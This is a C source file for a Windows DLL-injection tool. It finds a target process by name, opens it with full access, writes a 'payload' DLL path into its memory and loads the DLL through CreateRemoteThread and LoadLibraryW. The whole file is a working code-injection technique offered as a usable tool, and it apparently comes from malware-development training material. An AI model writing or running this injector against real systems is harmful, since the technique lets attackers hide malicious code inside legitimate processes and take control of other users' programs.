#include <Windows.h>
#include <stdio.h>
#include <Tlhelp32.h>

BOOL InjectLibraryIntoProcess(HANDLE processHandle, LPWSTR libraryName) {
    BOOL resultState = TRUE;
    LPVOID kernelLoadLibraryW = NULL;
    LPVOID allocatedMemory = NULL;
    DWORD sizeOfLibraryName = lstrlenW(libraryName) * sizeof(WCHAR);
    SIZE_T bytesWritten = NULL;
    HANDLE remoteThread = NULL;

    kernelLoadLibraryW = GetProcAddress(GetModuleHandle(L"kernel32.dll"), "LoadLibraryW");
    if (kernelLoadLibraryW == NULL) {
        printf("[!] Address Failed With Error : %d \n", GetLastError());
        resultState = FALSE;
        goto Cleanup;
    }

    allocatedMemory = VirtualAllocEx(processHandle, NULL, sizeOfLibraryName, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (allocatedMemory == NULL) {
        printf("[!] VirtualAlloc failed With Error : %d \n", GetLastError());
        resultState = FALSE;
        goto Cleanup;
    }

    printf("[i] Memory Allocated At : 0x%p Of Size : %d\n", allocatedMemory, sizeOfLibraryName);
    printf("[#] Press <Enter> To Write ... ");
    getchar();

    if (!WriteProcessMemory(processHandle, allocatedMemory, libraryName, sizeOfLibraryName, &bytesWritten) || bytesWritten != sizeOfLibraryName) {
        printf("[!] WriteProcessMemory Failed With Error : %d \n", GetLastError());
        resultState = FALSE;
        goto Cleanup;
    }

    printf("[i] Successfully Written %d Bytes\n", bytesWritten);
    printf("[#] Press <Enter> To Execute ... ");
    getchar();

    remoteThread = CreateRemoteThread(processHandle, NULL, 0, (LPTHREAD_START_ROUTINE)kernelLoadLibraryW, allocatedMemory, 0, NULL);
    if (remoteThread == NULL) {
        printf("[!] CreateRemoteThread Failed With Error : %d \n", GetLastError());
        resultState = FALSE;
        goto Cleanup;
    }
    printf("[+] Execution Complete!\n");

Cleanup:
    if (remoteThread)
        CloseHandle(remoteThread);
    return resultState;
}

BOOL RetrieveProcessHandle(LPWSTR targetProcessName, DWORD* processId, HANDLE* handleOfProcess) {
    HANDLE snapshotHandle = NULL;
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    snapshotHandle = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);
    if (snapshotHandle == INVALID_HANDLE_VALUE) {
        printf("[!] CreateToolhelp32Snapshot Failed With Error : %d \n", GetLastError());
        goto Finish;
    }

    if (!Process32First(snapshotHandle, &processEntry)) {
        printf("[!] Process32First Failed With Error : %d \n", GetLastError());
        goto Finish;
    }

    do {
        WCHAR lowerCaseName[MAX_PATH * 2];
        if (processEntry.szExeFile) {
            DWORD length = lstrlenW(processEntry.szExeFile);
            DWORD i = 0;
            RtlSecureZeroMemory(lowerCaseName, MAX_PATH * 2);
            if (length < MAX_PATH * 2) {
                for (; i < length; i++)
                    lowerCaseName[i] = (WCHAR)tolower(processEntry.szExeFile[i]);
                lowerCaseName[i++] = '\0';
            }
        }

        if (wcscmp(lowerCaseName, targetProcessName) == 0) {
            *processId = processEntry.th32ProcessID;
            *handleOfProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, processEntry.th32ProcessID);
            if (*handleOfProcess == NULL)
                printf("[!] OpenProcess Failed With Error : %d \n", GetLastError());
            break;
        }
    } while (Process32Next(snapshotHandle, &processEntry));

Finish:
    if (snapshotHandle != NULL)
        CloseHandle(snapshotHandle);
    if (*processId == NULL || *handleOfProcess == NULL)
        return FALSE;
    return TRUE;
}

int wmain(int argc, wchar_t* argv[]) {
    HANDLE targetProcessHandle = NULL;
    DWORD targetProcessId = NULL;

    if (argc < 3) {
        wprintf(L"[!] Usage : \"%s\" <Complete Dll Payload Path> <Process Name> \n", argv[0]);
        return -1;
    }

    wprintf(L"[i] Looking For Process Id Of \"%s\" ... ", argv[2]);
    if (!RetrieveProcessHandle(argv[2], &targetProcessId, &targetProcessHandle)) {
        printf("[!] Process Not Found \n");
        return -1;
    }
    wprintf(L"[+] Search Complete \n");

    printf("[i] Target Process Pid: %d \n", targetProcessId);
    if (!InjectLibraryIntoProcess(targetProcessHandle, argv[1])) {
        return -1;
    }

    CloseHandle(targetProcessHandle);
    printf("[#] Press <Enter> To Exit ... ");
    getchar();
    return 0;
}
